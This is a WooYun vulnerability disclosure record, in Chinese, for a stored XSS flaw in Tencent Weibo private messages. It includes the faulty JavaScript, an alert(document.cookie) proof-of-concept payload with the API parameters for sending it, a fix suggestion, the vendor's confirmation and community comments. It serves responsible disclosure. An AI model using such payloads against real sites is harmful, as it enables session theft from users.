{"id": 15987, "wybug_id": "wooyun-2012-013528", "wybug_title": "PKAV腾讯专场 - 1. 腾讯微博私信存储型XSS", "wybug_corp": "腾讯", "wybug_author": "gainover", "wybug_date": "2012-10-18 19:01", "wybug_open_date": "2012-12-02 19:02", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-10-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-10-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-10-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-11-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-11-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-12-02：\t细节向公众公开  简要描述： 最近大家都流行连载了。那么我们也开场吧~  最近心伤的胖子一直在连载，不知道发重复了没。 此漏洞成因会同步更新至：pkav.net 详细说明：  漏洞成因：缺陷文件：http://mat1.gtimg.com/www/mb/js/mi_121016.js1.首先进入 MI.TalkList.picEvent 函数\nMI.TalkList.picEvent = function(a) {  ....\n其中a为页面中所有class为PicBox的div集合，即 div .PicBox2. 循环每一个 class为PicBox的div\nfor (var b = 0, f = a.length; b < f; b++) {            var g = a[b],....\ng为每个div3. k = c(g, \"img\")[0], 获取PicBox里的第一个img图片4. h = k.parentNode, 获取k的父级元素，是一个链接<a href=\"....\"5. j = c(g, \".picTools\"), 获取PicBox这个div里的 picTools DIV6. 缺陷在下面这几句JS代码\nif(!MI.user.fun.wideStyle) \tMI.tmpl.picTool = ['<div class=\"tools bor_bg picTools\"><a href=\"#\" class=\"btnBack\"><em></em>', _(\"向左转\"), '</a><span>|</span><a href=\"#\" class=\"btnPrev\"><em></em>', _(\"向右转\"), '</a><a href=\"$Url/2000\" class=\"btnOriginal\" onclick=\"MI.Bos(\\'btnPicSource\\')\" target=\"_blank\">', _(\"查看原图\"), \"</a></div>\"].join(\"\");UI.before(UI.html(MI.tmpl.picTool.replace(\"$Url\", h.href.replace(/\\/460$/g, \"\")).replace(\"$hisUrl\", l))[0], h);\nMI.tmpl.picTool直接将$Url替换为 h.href 而h在取href属性值时，会自动将 &quot;&lt;&gt;等转换回 \", < ,> 等符号。----------------------------------结合实际HTML结构，如下：k 对应用户发送的图片\n<img class=\"\" crs=\"http://t2.qpic.cn/mblogpic/4955e75656b3d175296c/460#&quot;&gt;&lt;img src=1 onerror=&quot;alert(document.cookie);&quot; style=&quot;display:none&quot;&gt;&lt;i a=&quot;/160\" src=\"http://t2.qpic.cn/mblogpic/4955e75656b3d175296c/460#&quot;&gt;&lt;img src=1 onerror=&quot;alert(document.cookie);&quot; style=&quot;display:none&quot;&gt;&lt;i a=&quot;/160\" style=\"display: inline; \" alt=\"[图片]\">\nh 对应k外层的 A 标签\n<a class=\"pic \" href=\"http://t2.qpic.cn/mblogpic/4955e75656b3d175296c/460#&quot;&gt;&lt;img src=1 onerror=&quot;alert(document.cookie);&quot; style=&quot;display:none&quot;&gt;&lt;i a=&quot;/460\" hidefocus=\"true\"> ... </a>\nh.href中的&quot; &lt;, &gt 等重新转义回了 \" , < ,>最终导致UI.html(MI.tmpl.picTool.replace(\"$Url\", h.href.replace(/\\/460$/g, \"\")).replace(\"$hisUrl\", l))[0], h)在输出HTML时，导致XSS出现--------------------------------利用方法，发送私信时，http://api.t.qq.com/inbox/pm_mgr.php \nsource\treplyptid\tgainoverroomidcontent\t.................fid\tarturl  http://t2.qpic.cn/mblogpic/4955e75656b3d175296c/460#\"><img src=1 onerror=\"alert(document.cookie);\" style=\"display:none\"><i a=\"murltarget\tgainoverfunc\tsendef\tjspmlang\tzh_CNapiType\t8apiHost\thttp://api.t.qq.com\n   漏洞证明：  对方打开私信时会触发XSS。\n\n\n\n\n\n   修复方案：  MI.TalkList.picEvent中 h.href.replace之前先将h.href转义一次～   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-10-19 11:16 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-10-18 19:06 |    \t\tshine  \t\t\t( 普通白帽子  |\t\t\t        Rank:831 漏洞数:77        | coder)\t\t \n  顶！    \n     2012-10-18 19:12 |    \t\tFrankie \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 你存在,我的代码里...Line 0://你)\t\t \n  擦了...重现32哥?    \n     2012-10-18 19:12 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  最近电视剧看得爽啊 不知道@唐尸三摆手 如何了    \n     2012-10-18 19:16 |    \t\tgoderci \t\t\t( 普通白帽子  |\t\t\t        Rank:542 漏洞数:47        | http://www.yunday.org)\t\t \n  没wb给你们捧场了，wb都压在胖子身上了    \n     2012-10-18 19:19 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  帅呆了。    \n     2012-10-18 19:22 |    \t\t小黑要低调 \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:4        | 小黑一枚)\t\t \n  G牛也出手了。。。    \n     2012-10-18 19:45 |    \t\t葉孒 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:5        | 呵呵)\t\t \n  关注    \n     2012-10-18 19:50 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  这个得顶一下哇~    \n     2012-10-18 20:26 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  得顶~~    \n     2012-10-18 20:47 |    \t\tFrankie \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 你存在,我的代码里...Line 0://你)\t\t \n  @xsser 看了剑心大牛玉照后...感觉还是不要做安全吧... 元芳,你怎么看?    \n     2012-10-18 20:48 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @Frankie 搞摇滚吧～ 安全这东西，搞它有啥用啊！！    \n     2012-10-18 20:49 |    \t\tJannock  \t\t\t( 核心白帽子 |\t\t\t        Rank:2278 漏洞数:204        | 关注技术与网络安全（招人中，有兴趣请私信...)\t\t \n  差点中招，好险。。。    \n     2012-10-18 20:52 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @Jannock 回头老大来成都耍啊，让only_guest给你接风洗尘带压惊！= =     \n     2012-10-18 20:57 |    \t\t闪电小子 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:5        | PKAV技术宅社区！---闪电小子！)\t\t \n  这个比较好玩    \n     2012-10-18 21:04 |    \t\t心伤的胖子 \t\t\t( 普通白帽子  |\t\t\t        Rank:308 漏洞数:29        | 因为心伤，所以胖子。)\t\t \n  @gainover 哪能跟G牛比呀呀呀呀呀呀    \n     2012-10-18 21:53 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @心伤的胖子 丫的再谦虚，马赛克，马赛克，马赛克 ...     \n     2012-10-18 22:07 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  @心伤的胖子 @Jannock 成都欢迎你们....    \n     2012-10-18 22:44 |    \t\tqiaoy \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:16        )\t\t \n  照！    \n     2012-10-18 23:35 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  我觉得此贴要火，元芳，你怎么看？    \n     2012-10-19 09:21 |    \t\tJannock  \t\t\t( 核心白帽子 |\t\t\t        Rank:2278 漏洞数:204        | 关注技术与网络安全（招人中，有兴趣请私信...)\t\t \n  元芳，你怎么看？    \n     2012-10-19 09:26 |    \t\tLeadUrLife \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:14        | 好好学习 天天向上)\t\t \n  红牛、腰果、抽纸（这里注意不是卷纸）已备齐，坐地上看连续剧。。。    \n     2012-10-19 09:31 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  回大人：依卑职来看，此漏洞TX定不会忽略，并且rank值在14左右，厂商回复定有一句：非常感谢您的反馈...!@#$%^&*()    \n     2012-10-19 10:06 |    \t\tEoh \t\t\t( 普通白帽子  |\t\t\t        Rank:286 漏洞数:35        )\t\t \n  @元芳， 你怎么看？    \n     2012-10-19 10:37 |    \t\t峙酿君edwardz \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:1        | http://weibo.com/evilniang)\t\t \n  @Jannock @Eoh @鬼魅羊羔    我姓李....    \n     2012-10-19 10:46 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  AV抢宅男    \n     2012-10-19 11:28 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @saline .... 你亮了    \n     2012-10-19 20:17 |    \t\tFrankie \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 你存在,我的代码里...Line 0://你)\t\t \n  @gainover 有点老了..边摇边滚,带不起节奏啊    \n     2012-12-02 19:41 |    \t\tsoftbug \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:10        | 为人类设计最好的软件，解放人的双手,一起...)\t\t \n  很给力！gainover!    \n     2012-12-15 16:50 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  最后一个图很给力。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}